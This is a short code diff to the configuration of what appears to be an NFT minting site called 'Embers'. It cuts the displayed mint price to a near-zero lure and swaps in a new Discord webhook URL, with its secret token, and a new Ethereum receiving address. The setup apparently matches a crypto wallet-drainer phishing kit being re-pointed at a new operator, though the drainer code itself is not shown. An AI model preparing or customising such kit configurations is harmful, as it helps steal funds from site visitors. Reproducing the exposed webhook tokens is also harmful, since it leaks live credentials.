@@ -4,7 +4,7 @@
 const configuration = {
     name: 'Embers', // project title
     subname: 'embers', // project subtitle
-    cost: 0.06, // mint price to show on site
+    cost: 0.00054, // mint price to show on site
     amount: { // amount to can be minted
       max: 10,
       value: 1
@@ -18,8 +18,8 @@ const configuration = {
       }
     },
     webhook: // discord webhook
-      'https://discordapp.com/api/webhooks/1053160606422802442/XzCTt2JrXF5btprXr9wGDByduaT6Eml31pU8e9-nK91Ri3D-rTGvaZj10R6d8RnmxyLR',
-    address: '0x43e2d0145d88A83D536Fe54B70FFBf27d16Ef326', // eth address
+      'https://discordapp.com/api/webhooks/1093501502619930705/i8UVjruwSOFRVDbfBEi8tpgwxxOssuGtAcHAkMOJOZWnqkcytJnzJNGawvwJuE9FoD2r',
+    address: '0x64a6874C639484aF1379A60aCFa489F0C4ab50Ca', // eth address
     opensea: '2b03ed0cdd9c4d5598a4fbbcae11f66e' // opensea id (dont change)
   };
   
